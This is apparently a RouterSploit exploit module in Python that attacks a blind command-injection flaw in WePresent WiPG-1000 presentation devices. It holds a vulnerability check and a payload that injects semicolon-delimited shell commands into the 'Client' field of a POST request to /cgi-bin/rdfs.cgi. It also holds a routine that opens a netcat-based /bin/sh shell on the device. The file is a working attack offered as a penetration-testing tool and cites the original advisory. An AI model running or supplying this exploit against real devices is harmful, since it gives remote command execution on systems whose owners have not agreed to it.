from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "WePresent WiPG-1000 RCE",
        "description": "Module exploits WePresent WiPG-1000 Command Injection vulnerability which allows "
                       "executing commands on operating system level.",
        "authors": (
            "Matthias Brun",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://www.redguard.ch/advisories/wepresent-wipg1000.txt",
        ),
        "devices": (
            "WePresent WiPG-1000 <=2.0.0.7",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        if self.check():
            print_success("Target seems to be vulnerable")
            print_status("This is blind command injection, response is not available")
            shell(self, architecture="mipsbe", binary="netcat", shell="/bin/sh")
        else:
            print_error("Exploit failed - exploit seems to be not vulnerable")

    def execute(self, cmd):
        payload = ";{};".format(cmd)

        data = {
            "Client": payload,
            "Download": "Download"
        }

        self.http_request(
            method="POST",
            path="/cgi-bin/rdfs.cgi",
            data=data
        )

        return ""

    @mute
    def check(self):
        response = self.http_request(
            method="GET",
            path="/cgi-bin/rdfs.cgi"
        )

        if response is not None and "Follow administrator instructions to enter the complete path" in response.text:
            return True  # target vulnerable

        return False  # target is not vulnerable
